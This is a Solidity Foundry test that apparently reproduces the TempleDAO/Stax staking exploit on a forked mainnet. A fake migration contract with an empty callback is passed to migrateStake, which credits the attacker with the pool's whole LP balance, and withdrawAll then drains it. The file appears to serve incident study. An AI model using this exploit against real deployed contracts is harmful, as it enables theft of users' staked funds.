// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {IERC20} from '../../interfaces/IERC20.sol';

import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';

interface IStax {
    function migrateStake(address oldStaking, uint256 amount) external;
    function withdrawAll(bool claim) external;
    function balanceOf(address) external returns (uint256);
}

contract Exploit_TempleDAO is TestHarness, TokenBalanceTracker {
    IERC20 internal staxLpToken = IERC20(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9);
    IStax internal stax = IStax(0xd2869042E12a3506100af1D192b5b04D65137941);

    function setUp() external {
        cheat.createSelectFork('mainnet', 15725066);
        cheat.deal(address(this), 0 ether);

        addTokenToTracker(address(staxLpToken));
        updateBalanceTracker(address(this));
        updateBalanceTracker(address(stax));
    }
    
    function test_attack() external {
        console.log('------- INITIAL STATUS -------');
        console.log('Attacker balances');
        logBalances(address(this));
        console.log('Stax Pool balances');
        logBalances(address(stax));
        uint256 balanceBefore = stax.balanceOf(address(this));

        console.log('------- STEP 1: MIGRATE -------');
        address migrationTarget = address(new FakeMigrate{salt: bytes32(0)}());

        uint256 staxBalance = staxLpToken.balanceOf(address(stax));
        stax.migrateStake(migrationTarget, staxBalance);

        console.log('Attacker balances');
        logBalances(address(this));
        console.log('Stax Pool balances');
        logBalances(address(stax));  

        console.log('------- STEP 2: WITHDRAW -------');
        stax.withdrawAll(false);
        
        console.log('Attacker balances');
        logBalances(address(this));
        console.log('Stax Pool balances');
        logBalances(address(stax));
        uint256 balanceAfter = stax.balanceOf(address(this));
        assertGe(balanceAfter, balanceBefore);
    }
}

contract FakeMigrate {
    // Migration callback
    function migrateWithdraw(address staker, uint256 amount) external {}
}
